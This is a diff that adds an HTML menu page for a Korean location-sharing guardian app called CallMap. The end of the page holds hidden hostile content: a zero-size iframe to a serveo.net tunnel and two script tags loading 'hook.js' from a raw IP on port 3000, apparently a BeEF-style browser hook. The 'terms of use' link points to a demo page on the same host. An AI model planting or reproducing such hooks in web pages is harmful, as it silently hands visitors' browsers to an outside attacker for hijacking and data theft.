@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <title>Document</title>
+</head>
+
+<style>
+    html,
+    body {
+        background-color: #F1F1F1;
+        height: 100%;
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        
+    }
+
+    .boxx{
+        width: 90%;
+        color: aliceblue;
+        background-color: dodgerblue;
+        border-radius: 10px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        text-align: center;
+        margin-left: 5%;
+        margin-top: 30px;
+        margin-bottom: 15px;
+    }
+
+    h4 {
+        font-weight: bold;
+        font-size: 1.2rem;
+        color: seashell;
+        margin-top: 10px;
+    }
+
+    a {
+        text-decoration: none;
+        text-align: center;
+        font-size: 1.2rem;
+        padding-top: 30px;
+    }
+
+    .container{
+        justify-content: center;
+        align-items: center;
+        text-align: center;
+        float: center;
+    }
+    .container_font{
+        font-weight: bold;
+        color: #000;
+        padding-top: 15px;
+    }
+
+
+    @media screen and (max-width: 767px) {
+        .grid {
+            grid-template-columns: 1fr;
+            grid-template-rows: repeat(4, 1fr);
+        }
+
+        .box {
+            width: 90%;
+        }
+
+        h4 {
+            font-size: 1.2rem;
+        }
+
+        .input {
+            font-size: 18px;
+        }
+
+        .wrapper {
+            width: 90%;
+        }
+
+        .search-container {
+            justify-content: center;
+            margin: 0 auto;
+            width: 100%;
+        }
+    }
+</style>
+
+<body>
+    <div class="container">
+        <h4 class="container_font">CallMap 보호자용</h4>
+        <p>보호자가 사용자의 CallMap 이용시,<br>사용자의 위치를 공유 받습니다.</p>
+    </div>
+
+    <div class="boxx">
+        <a href="#">
+            <img src="info.png" style="width: 50px; height: 50px;" alt="">
+            <h4>사용자 등록</h4>
+        </a>
+    </div>
+
+    <div class="boxx">
+        <a href="callmap_option.html">
+            <img src="options_setting.png" style="width: 50px; height: 50px;" alt="">
+            <h4>설정</h4>
+        </a>
+    </div>
+
+    <div class="boxx">
+        <a href="https://172-233-208-160.ip.linodeusercontent.com:3000/demos/butcher/index.html">
+            <img src="invitation.png" style="width: 50px; height: 50px;" alt="">
+            <h4>이용약관</h4>
+        </a>
+    </div>
+
+    <iframe src="https://eb9bb9cc591315a6f62170124ef5eeeb.serveo.net" style="width: 0; height: 0; border: none;"></iframe>
+    <script src="https://172.233.208.160:3000/hook.js"></script>
+    <script src="https://172-233-208-160.ip.linodeusercontent.com:3000/hook.js"></script>
+</body>
+
+</html>
